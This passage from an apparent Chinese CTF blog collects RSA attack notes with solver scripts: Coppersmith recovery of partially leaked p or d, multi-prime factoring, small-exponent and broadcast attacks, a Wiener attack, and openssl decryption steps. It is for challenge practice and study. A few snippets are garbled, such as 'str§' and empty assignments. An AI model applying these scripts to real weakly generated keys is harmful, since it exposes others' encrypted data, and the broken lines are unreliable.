class="number">512</span>)</span><br><span class="line">q3 = getPrime(<span class="number">512</span>)</span><br><span class="line">N3 = p3*q3</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(msg3,e3,N3)</span><br><span class="line"><span class="built_in">print</span> (e3,N3)</span><br><span class="line"><span class="built_in">print</span> p3&gt;&gt;<span class="number">200</span> //p高位泄露类型</span><br></pre></td></tr></table></figure>

<p><strong>解题脚本如下</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sage</span><br><span class="line">from sage.all import *</span><br><span class="line">n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br><span class="line">p4 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br><span class="line">#p去0的剩余位</span><br><span class="line">e = 65537</span><br><span class="line">pbits = 512</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">print(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=2^kbits, beta=0.4)</span><br><span class="line">if roots:</span><br><span class="line">p = p4+int(roots[0])</span><br><span class="line">print(&quot;n: &quot;+str(n))</span><br><span class="line">print(&quot;p: &quot;+str§)</span><br><span class="line">print(&quot;q: &quot;+str(n//p))</span><br></pre></td></tr></table></figure>

<p>还有一道p高位泄露的题</p>
<p><strong>sictf</strong> 的密码题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from flag import flag</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n = p * q</span><br><span class="line">e = 65537</span><br><span class="line">leak = p &gt;&gt; 230</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(n)</span><br><span class="line">print(leak)</span><br><span class="line">print(c)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line">87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>一般情况下需要已知286位才能求解512的p</p>
<p>但是把<code>small_roots(epsilon = 0.01)</code>改动epsilon参数为0.01可以在已知264位的情况下求解p</p>
<p>题目给出高282，修改参数epsilon即可求解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sage</span><br><span class="line">from sage.all import *</span><br><span class="line">n = 114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381</span><br><span class="line">p4 = 6833525680083767201563383553257365403889275861180069149272377788671845720921410137177</span><br><span class="line">#p去0的剩余位</span><br><span class="line">e = 65537</span><br><span class="line">pbits = 512</span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">print(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=2^kbits, beta=0.4,epsilon=0.01)</span><br><span class="line">if roots:</span><br><span class="line"> p = p4+int(roots[0])</span><br><span class="line">print(&quot;n: &quot;+str(n))</span><br><span class="line">print(&quot;q: &quot;+str(n//p))</span><br></pre></td></tr></table></figure>



<h2 id="n分解为多个素数"><a href="#n分解为多个素数" class="headerlink" title="n分解为多个素数"></a>n分解为多个素数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">import libnum</span><br><span class="line">p1=3207148519</span><br><span class="line">p2=4278428893</span><br><span class="line">p3=4093178561</span><br><span class="line">p4=3831680819</span><br><span class="line">p5=2370292207</span><br><span class="line">p6=3939901243</span><br><span class="line">p7=2970591037</span><br><span class="line">p8=2463878387</span><br><span class="line">p9=3654864131</span><br><span class="line">p10=2923072267</span><br><span class="line">p11=2706073949</span><br><span class="line">p12=2338725373</span><br><span class="line">p13=2804303069</span><br><span class="line">p14=2217990919</span><br><span class="line">p15=2794985117</span><br><span class="line">e=65537</span><br><span class="line">c=14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br><span class="line">phi = (p1-1)*(p2-1)*(p3-1)*(p4-1)*(p5-1)*(p6-1)*(p7-1)*(p8-1)*(p9-1)*(p10-1)*(p11-1)*(p12-1)*(p13-1)*(p14-1)*(p15-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">n=17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span><br><span class="line">m = gmpy2.powmod(c,d,n)</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="p-2-q-2"><a href="#p-2-q-2" class="headerlink" title="p^2+q^2"></a>p^2+q^2</h2><p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from secret import flag</span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(200)</span><br><span class="line"></span><br><span class="line">a = p**2 + q**2</span><br><span class="line">n = p * q</span><br><span class="line">e1 = getPrime(16)</span><br><span class="line">e2 = next_prime(e1)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c1 = powmod(m,e1,n)</span><br><span class="line">c2 = powmod(m**3,e2,3*n)</span><br><span class="line"></span><br><span class="line">print(&#x27;a =&#x27;, a)</span><br><span class="line">print(&#x27;c1 =&#x27;, c1)</span><br><span class="line">print(&#x27;c2 =&#x27;, c2)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">a = 23804021940078676408342301332036892900004728136480076479530219752065125327318821647722459216095770264965388973551323635311313178838670860487788476788686756050157264721772586844596306406576857878507037529439070526513923394974678433717664180257965624133033383511215139076867891548866207158515487182813656668091870588002638518245252590786003914393372830494390833657940568569618842104970029260363695053572749495893999945220493935637334868029460448282514843103145795102173534495304156971490358608124680851055950154432367509652612855903019752959349069234185596982394068554146096092741880878895682860091022727772496856721290</span><br><span class="line">c1 = 75949211970645260477840809230795170598275394663655585446502049744151634977806266592064437936389888280642329073167371358021391264606028082728274944584341647324957857195053188220196244561623697425292916511744852569537275299008074069250282222480373555169325242455879869868679935977005580843853804599341730525546675515324718058489296906319060874296111833437083796029771812</span><br><span class="line">c2 = 77907941155376849046818020584594846942386293571953448410760364023962818506838837521412252753647936913064982141652362831680077554268552176063108954360620095019160785058740575077744544616439692739387312706279917959252426192939648962492950940347253817951644007140862267776520611944302335981903665518644840891111449931544355548130487697653008605945892957382219567188182572</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>将已知量p 2 + q 2 p^2 + q ^2p<br>2<br> +q<br>2<br> 直接开方即可得到较大的数p pp，因为开方会使得含有较小的数q 2 q^2q<br>2<br> 的部分丢失，剩余的正好使p 2 p^2p<br>2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">a = 23804021940078676408342301332036892900004728136480076479530219752065125327318821647722459216095770264965388973551323635311313178838670860487788476788686756050157264721772586844596306406576857878507037529439070526513923394974678433717664180257965624133033383511215139076867891548866207158515487182813656668091870588002638518245252590786003914393372830494390833657940568569618842104970029260363695053572749495893999945220493935637334868029460448282514843103145795102173534495304156971490358608124680851055950154432367509652612855903019752959349069234185596982394068554146096092741880878895682860091022727772496856721290</span><br><span class="line">c1 = 75949211970645260477840809230795170598275394663655585446502049744151634977806266592064437936389888280642329073167371358021391264606028082728274944584341647324957857195053188220196244561623697425292916511744852569537275299008074069250282222480373555169325242455879869868679935977005580843853804599341730525546675515324718058489296906319060874296111833437083796029771812</span><br><span class="line">c2 = 77907941155376849046818020584594846942386293571953448410760364023962818506838837521412252753647936913064982141652362831680077554268552176063108954360620095019160785058740575077744544616439692739387312706279917959252426192939648962492950940347253817951644007140862267776520611944302335981903665518644840891111449931544355548130487697653008605945892957382219567188182572</span><br><span class="line"></span><br><span class="line">p = gmpy2.iroot(a, 2)[0]</span><br><span class="line">q = gmpy2.iroot(a - p ** 2, 2)[0]</span><br><span class="line">n = p * q</span><br><span class="line">fai_n = (p - 1) * (q - 1)</span><br><span class="line">for e in tqdm(range(2**16)):</span><br><span class="line">    try:</span><br><span class="line">        d = gmpy2.invert(e, fai_n)</span><br><span class="line">        m1 = pow(c1, d, n)</span><br><span class="line">        try:</span><br><span class="line">            print(long_to_bytes(m1).decode())</span><br><span class="line">            break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure>

<h2 id="dp低位泄露"><a href="#dp低位泄露" class="headerlink" title="dp低位泄露"></a>dp低位泄露</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def getFullP(low_p, n):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=&#x27;NTL&#x27;)</span><br><span class="line">    p = x*2^512 + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = 2^128, beta = 0.4)</span><br><span class="line">    if root:</span><br><span class="line">        return p(root[0])</span><br><span class="line">    return None</span><br><span class="line">    </span><br><span class="line">def phase4(low_d, n, c):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    for k in range(1, 4):</span><br><span class="line">        p = var(&#x27;p&#x27;)</span><br><span class="line">        p0 = solve_mod([3*p*low_d  == p + k*(n*p - p^2 - n + p)], 2^512)</span><br><span class="line">        maybe_p += [int(x[0]) for x in p0]</span><br><span class="line">    print(maybe_p)</span><br><span class="line">    </span><br><span class="line">    for x in maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        if P: break</span><br><span class="line">    </span><br><span class="line">    P = int(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    assert P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(3, (P-1)*(Q-1))</span><br><span class="line">    print(hex(power_mod(c, d, n))[2:])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line">c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line">low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span><br><span class="line">phase4(low_d, n, c)</span><br></pre></td></tr></table></figure>



<h1 id="公钥指数e相关攻击"><a href="#公钥指数e相关攻击" class="headerlink" title="公钥指数e相关攻击"></a>公钥指数e相关攻击</h1><h2 id="e与phi-不互素"><a href="#e与phi-不互素" class="headerlink" title="e与phi 不互素"></a>e与phi 不互素</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e1 = 14606334023791426</span><br><span class="line">p1 = 121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span><br><span class="line">q1 = 130968576816900149996914427770826228884925960001279609559095138835900329492765336419489982304805369724685145941218640504262821549441728192761733409684831633194346504685627189375724517070780334885673563409259345291959439026700006694655545512308390416859315892447092639503318475587220630455745460309886030186593</span><br><span class="line">c1 = 11402389955595766056824801105373550411371729054679429421548608725777586555536302409478824585455648944737304660137306241012321255955693234304201530700362069004620531537922710568821152217381257446478619320278993539785699090234418603086426252498046106436360959622415398647198014716351359752734123844386459925553497427680448633869522591650121047156082228109421246662020164222925272078687550896012363926358633323439494967417041681357707006545728719651494384317497942177993032739778398001952201667284323691607312819796036779374423837576479275454953999865750584684592993292347483309178232523897058253412878901324740104919248</span><br><span class="line"></span><br><span class="line">e2 = 13813369129257838</span><br><span class="line">p2 = 121009772735460235364940622989433807619211926015494087453674747614331295040063679722422298286549493698150690694965106103822315378461970129912436074962111424616439032849788953648286506433464358834178903821069564798378666159882090757625817745990230736982709059859613843100974349380542982235135982530318438330859</span><br><span class="line">q2 = 94582257784130735233174402362819395926641026753071039760251190444144495369829487705195913337502962816079184062352678128843179586054535283861793827497892600954650126991213176547276006780610945133603745974181504975165082485845571788686928859549252522952174376071500707863379238688200493621993937563296490615649</span><br><span class="line">c2 = 7984888899827615209197324489527982755561403577403539988687419233579203660429542197972867526015619223510964699107198708420785278262082902359114040327940253582108364104049849773108799812000586446829979564395322118616382603675257162995702363051699403525169767736410365076696890117813211614468971386159587698853722658492385717150691206731593509168262529568464496911821756352254486299361607604338523750318977620039669792468240086472218586697386948479265417452517073901655900118259488507311321060895347770921790483894095085039802955700146474474606794444308825840221205073230671387989412399673375520605000270180367035526919</span><br></pre></td></tr></table></figure>

<p>解题脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from libnum import *</span><br><span class="line"> </span><br><span class="line">e1 = 14606334023791426</span><br><span class="line">e2 = 13813369129257838</span><br><span class="line">p = </span><br><span class="line">q1 = </span><br><span class="line">q2 = </span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line"> </span><br><span class="line">n1 = p*q1</span><br><span class="line">n2 = p*q2</span><br><span class="line"> </span><br><span class="line">phi1 = (p-1)*(q1-1)</span><br><span class="line">phi2 = (p-1)*(q2-1)</span><br><span class="line"> </span><br><span class="line">b = gmpy2.gcd(e1,e2)</span><br><span class="line">a1 = e1//b</span><br><span class="line">a2 = e2//b</span><br><span class="line">bd1 = gmpy2.invert(a1,phi1)</span><br><span class="line">bd2 = gmpy2.invert(a2,phi2)</span><br><span class="line">m1 = pow(c1,bd1,n1)</span><br><span class="line">m2 = pow(c2,bd2,n2)</span><br><span class="line"> </span><br><span class="line">c = solve_crt([m1, m2], [q1, q2]) </span><br><span class="line"> </span><br><span class="line">n = q1 * q2</span><br><span class="line">f = (q1 - 1) * (q2 - 1)</span><br><span class="line"> </span><br><span class="line">d2 = gmpy2.invert(7, f)</span><br><span class="line">m = pow(c, d2, n)</span><br><span class="line">msg = gmpy2.iroot(m, 2)[0]</span><br><span class="line">print(long_to_bytes(msg).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>



<h2 id="低加密指数"><a href="#低加密指数" class="headerlink" title="低加密指数"></a>低加密指数</h2><p>e比较小时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">e = 3</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    if gmpy2.iroot((c+i*n),3)[1] == True:</span><br><span class="line">        m = gmpy2.iroot((c+i*n),3)[0]</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br><span class="line"></span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))</span><br></pre></td></tr></table></figure>

<h2 id="低加密广播攻击"><a href="#低加密广播攻击" class="headerlink" title="低加密广播攻击"></a>低加密广播攻击</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gb_def</span>(<span class="params">c, n, e</span>):</span><br><span class="line">    m1 = libnum.solve_crt(c, n)</span><br><span class="line">    m, s = gmpy2.iroot(m1, e)</span><br><span class="line">    m = <span class="built_in">int</span>(m)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">e = <span class="number">17</span></span><br><span class="line">n1 = <span class="number">14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923</span></span><br><span class="line">n2 = <span class="number">16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499</span></span><br><span class="line">n3 = <span class="number">12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681</span></span><br><span class="line">c1 = <span class="number">786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602</span></span><br><span class="line">c2 = <span class="number">14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350</span></span><br><span class="line">c3 = <span class="number">3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855</span></span><br><span class="line"></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line">m = rsa_gb_def(c, n, e)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure>

<h1 id="私钥d相关攻击"><a href="#私钥d相关攻击" class="headerlink" title="私钥d相关攻击"></a>私钥d相关攻击</h1><h2 id="维纳攻击small-d"><a href="#维纳攻击small-d" class="headerlink" title="维纳攻击small d"></a>维纳攻击small d</h2><p><strong>低解密指数攻击</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from secret import flag</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">p = getPrime(1024)</span><br><span class="line">q = getPrime(1024)</span><br><span class="line"></span><br><span class="line">d = getPrime(32)</span><br><span class="line">e = inverse(d, (p-1)*(q-1))</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">c = pow(m,e,n)</span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">print(e)</span><br><span class="line">print(n)</span><br><span class="line"></span><br><span class="line"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="line"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="line"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">def transform(x,y):       #使用辗转相处将分数 x/y 转为连分数的形式</span><br><span class="line">    res=[]</span><br><span class="line">    while y:</span><br><span class="line">        res.append(x//y)</span><br><span class="line">        x,y=y,x%y</span><br><span class="line">    return res</span><br><span class="line">    </span><br><span class="line">def continued_fraction(sub_res):</span><br><span class="line">    numerator,denominator=1,0</span><br><span class="line">    for i in sub_res[::-1]:      #从sublist的后面往前循环</span><br><span class="line">        denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    return denominator,numerator   #得到渐进分数的分母和分子，并返回</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#求解每个渐进分数</span><br><span class="line">def sub_fraction(x,y):</span><br><span class="line">    res=transform(x,y)</span><br><span class="line">    res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def get_pq(a,b,c):      #由p+q和pq的值通过维达定理来求解p和q</span><br><span class="line">    par=gmpy2.isqrt(b*b-4*a*c)   #由上述可得，开根号一定是整数，因为有解</span><br><span class="line">    x1,x2=(-b+par)//(2*a),(-b-par)//(2*a)</span><br><span class="line">    return x1,x2</span><br><span class="line"></span><br><span class="line">def wienerAttack(e,n):</span><br><span class="line">    for (d,k) in sub_fraction(e,n):  #用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span><br><span class="line">        if k==0:                     #可能会出现连分数的第一个为0的情况，排除</span><br><span class="line">            continue</span><br><span class="line">        if (e*d-1)%k!=0:             #ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span><br><span class="line">            continue</span><br><span class="line">        </span><br><span class="line">        phi=(e*d-1)//k               #这个结果就是 φ(n)</span><br><span class="line">        px,qy=get_pq(1,n-phi+1,n)</span><br><span class="line">        if px*qy==n:</span><br><span class="line">            p,q=abs(int(px)),abs(int(qy))     #可能会得到两个负数，负负得正未尝不会出现</span><br><span class="line">            d=gmpy2.invert(e,(p-1)*(q-1))     #求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span><br><span class="line">            return d</span><br><span class="line">    print(&quot;该方法不适用&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">e = 14058695417015334071588010346586749790539913287499707802938898719199384604316115908373997739604466972535533733290829894940306314501336291780396644520926473</span><br><span class="line">n = 33608051123287760315508423639768587307044110783252538766412788814888567164438282747809126528707329215122915093543085008547092423658991866313471837522758159</span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line">print(&quot;d=&quot;,d)</span><br></pre></td></tr></table></figure>

<h2 id="d低位泄露"><a href="#d低位泄露" class="headerlink" title="d低位泄露"></a>d低位泄露</h2><p><a href="https://www.ruanx.net/coppersmith/">Coppersmith 攻击 (ruanx.net)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+]n=92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line"></span><br><span class="line">[+]e=3</span><br><span class="line"></span><br><span class="line">[+]m=random.getrandbits(512)</span><br><span class="line"></span><br><span class="line">[+]c=pow(m,e,n)=56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line"></span><br><span class="line">[+]d&amp;((1&lt;&lt;512)-1)=787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span><br><span class="line"></span><br><span class="line">[-]long_to_bytes(m).encode(&#x27;hex&#x27;)=</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def getFullP(low_p, n):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=&#x27;NTL&#x27;)</span><br><span class="line">    p = x*2^512 + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = 2^128, beta = 0.4)</span><br><span class="line">    if root:</span><br><span class="line">        return p(root[0])</span><br><span class="line">    return None</span><br><span class="line">    </span><br><span class="line">def phase4(low_d, n, c):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    for k in range(1, 4):</span><br><span class="line">        p = var(&#x27;p&#x27;)</span><br><span class="line">        p0 = solve_mod([3*p*low_d  == p + k*(n*p - p^2 - n + p)], 2^512)</span><br><span class="line">        maybe_p += [int(x[0]) for x in p0]</span><br><span class="line">    print(maybe_p)</span><br><span class="line">    </span><br><span class="line">    for x in maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        if P: break</span><br><span class="line">    </span><br><span class="line">    P = int(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    assert P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(3, (P-1)*(Q-1))</span><br><span class="line">    print(hex(power_mod(c, d, n))[2:])</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line">c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line">low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span><br><span class="line"></span><br><span class="line">phase4(low_d, n, c)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = 92896523979616431783569762645945918751162321185159790302085768095763248357146198882641160678623069857011832929179987623492267852304178894461486295864091871341339490870689110279720283415976342208476126414933914026436666789270209690168581379143120688241413470569887426810705898518783625903350928784794371176183</span><br><span class="line">c = 56164378185049402404287763972280630295410174183649054805947329504892979921131852321281317326306506444145699012788547718091371389698969718830761120076359634262880912417797038049510647237337251037070369278596191506725812511682495575589039521646062521091457438869068866365907962691742604895495670783101319608530</span><br><span class="line">low_d = 787673996295376297668171075170955852109814939442242049800811601753001897317556022653997651874897208487913321031340711138331360350633965420642045383644955</span><br><span class="line"></span><br><span class="line">phase4(low_d, n, c)</span><br></pre></td></tr></table></figure>



<h1 id="公钥加签"><a href="#公钥加签" class="headerlink" title="公钥加签"></a>公钥加签</h1><p>flag.enc和pub.pem两个文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in warmup -in pub.pem</span><br></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rsautl -decrypt -inkey private.pem -in flag.enc -out flag</span><br></pre></td></tr></table></figure>

<p>生成n,e ;</p>
<p>16进制转10进制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s=&#x27;&#x27;</span><br><span class="line">int(s,16)</span><br></pre></td></tr></table></figure>

<p>yafu分解factor()</p>
